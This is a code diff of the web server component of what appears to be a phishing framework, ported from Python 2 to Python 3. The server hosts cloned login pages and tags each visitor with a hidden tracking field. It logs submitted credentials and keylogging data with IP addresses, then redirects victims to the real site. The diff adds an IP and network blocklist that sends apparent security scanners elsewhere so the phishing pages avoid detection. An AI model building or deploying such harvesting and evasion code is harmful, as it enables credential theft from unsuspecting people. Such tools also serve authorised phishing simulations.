@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #from __future__ import absolute_import
 #from __future__ import division
@@ -14,9 +14,11 @@ import time
 import os
 import re
 import subprocess
+import ipaddress
 from core.utils import Utils
 from core.display import Display
 from core.mydb import MyDB
+
 
 
 # define standard static page
@@ -25,7 +27,7 @@ class staticPage(Resource):
         self.text = text
 
     def render_GET(self, request):
-        return self.text
+        return self.text.encode()
 
 # define standard mobile page
 class mobilePage(Resource):
@@ -33,7 +35,7 @@ class mobilePage(Resource):
         self.text=" <html> <br> <br> <br> <head> <meta content='text/html; charset=windows-1252' http-equiv='content-type'> <meta http-equiv='refresh' content='5;URL="+url+"'> <title>"+title+"</title> </head> <body> <center> <br> <br> <br> <br>You are attempting to access this site from a mobile device.  <br> <br>Please try again later from a desktop computer.  </center> </body> </html>"
 
     def render_GET(self, request):
-        return self.text
+        return self.text.encode()
 
 # define standard error page
 class errorPage(Resource):
@@ -41,7 +43,7 @@ class errorPage(Resource):
         self.text = text
 
     def render_GET(self, request):
-        return self.text
+        return self.text.encode()
 
 # define standard error page
 class errorRedirectPage(Resource):
@@ -67,7 +69,21 @@ class phishingForm(Resource):
         self.display = Display()
         self.display.setLogPath(self.logpath)
         self.db = db
+
+        # build list of "bad" ips and networks based on https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10
+        self.bannedIP = Utils.listToIpAddresses(Utils.fileToList("misc/ips.redirect"))
+        self.bannedCIDR = Utils.listToIpNetworks(Utils.fileToList("misc/ranges.redirect"))
+        
         Resource.__init__(self)
+
+    def isBannedIP(self, clientIP):
+        cIP = ipaddress.ip_address(clientIP)
+        if cIP in self.bannedIP:
+            return True
+        for net in self.bannedCIDR:
+            if cIP in net:
+                return True
+        return False
 
     def loadIndex(self):
         with open (self.path + "INDEX", "r") as myfile:
@@ -85,30 +101,49 @@ class phishingForm(Resource):
             self.index = html
 
     def render_GET(self, request):
+        if(self.isBannedIP(request.getClientIP())):
+            request.redirect(self.redirecturl)
+            request.finish()
+            return NOT_DONE_YET
+
         # log the access
         username = "unknown"
         trackid = None
-        if "u" in request.args.keys():
+        if "u" in list(request.args.keys()):
             trackid = request.args["u"][0]
         if (self.config["enable_user_tracking"] == "1") and (trackid):
             username = self.db.findUser(trackid)
             if not username:
                 username = "unknown"
         self.display.log("%s,[ACCESS],%s-%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP()), filename=self.logfile)
-        print("::%s:: %s,[ACCESS],%s-%s" % (self.vhost, time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP()))
+        print(("::%s:: %s,[ACCESS],%s-%s" % (self.vhost, time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP())))
         sys.stdout.flush()
         # display phishing site
-        return str(re.sub("</form>", "<input type=\"hidden\" name=\"spfid\" value=\"" + username + "\"></form>", self.index, flags=re.I))
+        return str(re.sub("</form>", "<input type=\"hidden\" name=\"spfid\" value=\"" + username + "\"></form>", self.index, flags=re.I)).encode()
 
     def render_POST(self, request):
+        if(self.isBannedIP(request.getClientIP())):
+            request.redirect(self.redirecturl)
+            request.finish()
+            return NOT_DONE_YET
+
         # check to see if the POST is a keylogging post
-        if ("keylog" in request.args.keys()):
-            self.display.log("%s,[KEYLOGGING],%s,%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])), filename=self.logfile)
-            print("::%s:: %s,[KEYLOGGING],%s,%s" % (self.vhost,time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
+        if (b"keylog" in list(request.args.keys())):
+            self.display.log("%s,[KEYLOGGING],%s,%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in list(request.args.items())])), filename=self.logfile)
+            print("::%s:: %s,[KEYLOGGING],%s,%s" % (self.vhost,time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in list(request.args.items())])))
         else:
             # log the credentials
-            self.display.log("%s,[CREDENTIALS],%s,%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])), filename=self.logfile)
-            print("::%s:: %s,[CREDENTIALS],%s,%s" % (self.vhost,time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
+            self.display.log("%s,[CREDENTIALS],%s,%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in list(request.args.items())])), filename=self.logfile)
+
+            args = ""
+            for k in request.args.keys():
+                args += k.decode() + "="
+                vlist = request.args[k]
+                for v in vlist:
+                    args += v.decode() + ","
+                args += " "
+
+            print("::%s:: %s,[CREDENTIALS],%s,%s" % (self.vhost,time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), args))
         sys.stdout.flush()
         # redirect to target URL
         request.redirect(self.redirecturl)
@@ -124,27 +159,27 @@ class PhishingSite():
         self.config = config
         self.db = db
         self.resource = Resource()
-        self.resource.putChild("index", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
-        self.resource.putChild("", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
-        self.resource.putChild("robots.txt", staticPage("User-agent: *\rDisallow: /"))
+        self.resource.putChild(b"index", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
+        self.resource.putChild(b"", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
+        self.resource.putChild(b"robots.txt", staticPage("User-agent: *\rDisallow: /"))
 
         if (self.config["error_url"]):
             url = self.config["error_url"]
-            self.resource.putChild("error", errorRedirectPage(url))
-            self.resource.putChild("mobile", mobilePage(url))
+            self.resource.putChild(b"error", errorRedirectPage(url))
+            self.resource.putChild(b"mobile", mobilePage(url))
         elif (self.config["error_text"]):
             text = self.config["error_text"]
-            self.resource.putChild("error", staticPage(text))
+            self.resource.putChild(b"error", staticPage(text))
         else:
-            self.resource.putChild("error", staticPage("<html><body><center><h1>An error has occured.  Please try again later.</h1></center></body></html>"))
-            self.resource.putChild("mobile", mobilePage(url="/"))
+            self.resource.putChild(b"error", staticPage("<html><body><center><h1>An error has occured.  Please try again later.</h1></center></body></html>"))
+            self.resource.putChild(b"mobile", mobilePage(url="/"))
         self.loadChildren()
 
     # load any necessary resource subdirectories: js, css, img, etc...
     def loadChildren(self):
         for f in os.listdir(self.path):
             if os.path.isdir(os.path.join(self.path, f)):
-                self.resource.putChild(f, static.File(self.path + f))
+                self.resource.putChild(f.encode(), static.File(self.path + f))
 
     def getResource(self):
         return self.resource
@@ -179,31 +214,31 @@ class PhishingWebServer():
                 template_file = parts[0] + "/CONFIG"
                 if Utils.is_readable(template_file) and os.path.isfile(template_file):
                     templates.append(parts[0])
-                    print "STATIC = [%s]" % (parts[0])
+                    print("STATIC = [%s]" % (parts[0]))
             for template in db_dynamic_templates:
                 parts = template.split("[-]")
                 template_file = parts[0] + "/CONFIG"
                 if Utils.is_readable(template_file) and os.path.isfile(template_file):
                     templates.append(parts[0])
-                    print "DYNAMIC = [%s]" % (parts[0])
+                    print("DYNAMIC = [%s]" % (parts[0]))
         else:
             for f in os.listdir(self.config["web_template_path"]):
                 template_file = os.path.join(self.config["web_template_path"], f) + "/CONFIG"
                 if Utils.is_readable(template_file) and os.path.isfile(template_file):
                     templates.append(os.path.join(self.config["web_template_path"], f))
-                    print "FIXED = [%s]" % (os.path.join(self.config["web_template_path"], f))
+                    print("FIXED = [%s]" % (os.path.join(self.config["web_template_path"], f)))
         return templates
 
     def loadSites(self):
 
         templates = self.getTemplates()
-        print
 
         # loop over each web template
+        print()
         for f in templates:
             template_file = f + "/CONFIG"
             if Utils.is_readable(template_file) and os.path.isfile(template_file):
-                print "Found the following web sites: [%s]" % template_file
+                print("Found the following web sites: [%s]" % template_file)
                 # read in the VHOST, LOGFILE, and REDIRECTURL
                 VHOST = ""
                 LOGFILE = ""
@@ -241,15 +276,15 @@ class PhishingWebServer():
         agent = _escape(request.getHeader(b"user-agent") or b"-")
         duration = round(time.time() - request.started, 4)
         line = (
-            u'"%(ip)s" %(duration)ss "%(method)s %(uri)s %(protocol)s" '
-            u'%(code)d %(length)s "%(agent)s"' % dict(
+            '"%(ip)s" %(duration)ss "%(method)s %(uri)s %(protocol)s" '
+            '%(code)d %(length)s "%(agent)s"' % dict(
                 ip=_escape(request.getClientIP() or b"-"),
                 duration=duration,
                 method=_escape(request.method),
                 uri=_escape(request.uri),
                 protocol=_escape(request.clientproto),
                 code=request.code,
-                length=request.sentLength or u"-",
+                length=request.sentLength or "-",
                 agent=agent
                 ))
         return line
@@ -270,22 +305,22 @@ class PhishingWebServer():
                 site_length = len(key)
 
         # if we are doing port based
-        print
+        print()
         for key in self.phishingsites:
             for port in range(self.MINPORT, self.MAXPORT):
                 try:
                     site = Site(self.phishingsites[key], logPath=self.logpath + "logs/" + self.websites[key]['logfile']+".access")
 #                    site.logRequest = True
                     reactor.listenTCP(port, site)
-                    print "Started website [%s] on [http://%s:%s]" % (('{:<%i}' % (site_length)).format(key), self.config["ip"], port)
+                    print("Started website [%s] on [http://%s:%s]" % (('{:<%i}' % (site_length)).format(key), self.config["ip"], port))
                     self.websites[key]['port'] = port
                     break
-                except twisted.internet.error.CannotListenError, ex:
+                except twisted.internet.error.CannotListenError as ex:
                     continue
 
         # if we are doing virtual hosts
         if (self.config["enable_host_based_vhosts"] == "1"):
-            print
+            print()
 
             # GENERATING SSL CERTS ARE CURRENTLY BROKEN
             # TODO: Fix this
@@ -316,10 +351,10 @@ class PhishingWebServer():
             for key in self.phishingsites:
                 root.addHost(key + "." + self.config["phishing_domain"], proxy.ReverseProxyResource('localhost', self.websites[key]['port'], ''))
 #                print "Created VHOST [%s] -> [https://%s:%s]" % (('{:<%i}' % (site_length)).format(key + "." + self.config["phishing_domain"]), self.config["ip"], str(self.websites[key]['port']))
-                print "Created VHOST [%s] -> [http://%s:%s]" % (('{:<%i}' % (site_length)).format(key + "." + self.config["phishing_domain"]), self.config["ip"], str(self.websites[key]['port']))
+                print("Created VHOST [%s] -> [http://%s:%s]" % (('{:<%i}' % (site_length)).format(key + "." + self.config["phishing_domain"]), self.config["ip"], str(self.websites[key]['port'])))
             # add a mapping for the base IP address to map to one of the sites
             if (self.phishingsites):
-                root.addHost(self.config["ip"], proxy.ReverseProxyResource('localhost', int(self.websites[self.phishingsites.keys()[0]]['port']), ''))
+                root.addHost(self.config["ip"], proxy.ReverseProxyResource('localhost', int(self.websites[list(self.phishingsites.keys())[0]]['port']), ''))
                 try:
                     site = Site(root, logPath=self.logpath + "logs/root.log.access")
 
@@ -330,24 +365,24 @@ class PhishingWebServer():
 #                    )
 #                    reactor.listenSSL(int(self.config["default_web_ssl_port"]), site, contextFactory=sslContext)
                     reactor.listenTCP(int(self.config["default_web_port"]), site)
-                except twisted.internet.error.CannotListenError, ex:
+                except twisted.internet.error.CannotListenError as ex:
 #                    print "ERROR: Could not start web service listener on port [" + int(self.config["default_web_ssl_port"]) + "]!"
-                    print "ERROR: Could not start web service listener on port [80]!"
-                    print ex
-                    print "ERROR: Host Based Virtual Hosting will not function!"
+                    print("ERROR: Could not start web service listener on port [80]!")
+                    print(ex)
+                    print("ERROR: Host Based Virtual Hosting will not function!")
             else:
 #                print "ERROR: Could not start web service listener on port [" + int(self.config["default_web_ssl_port"]) + "]!"
-                print "ERROR: Could not start web service listener on port [80]!"
-                print "ERROR: Host Based Virtual Hosting will not function!"
+                print("ERROR: Could not start web service listener on port [80]!")
+                print("ERROR: Host Based Virtual Hosting will not function!")
 
-        print
-        print "Websites loaded and launched."
+        print()
+        print("Websites loaded and launched.")
         sys.stdout.flush()
         reactor.run()
 
 if __name__ == "__main__":
     def usage():
-        print "web.py <config file>"
+        print("web.py <config file>")
 
     if len(sys.argv) != 2:
         usage()
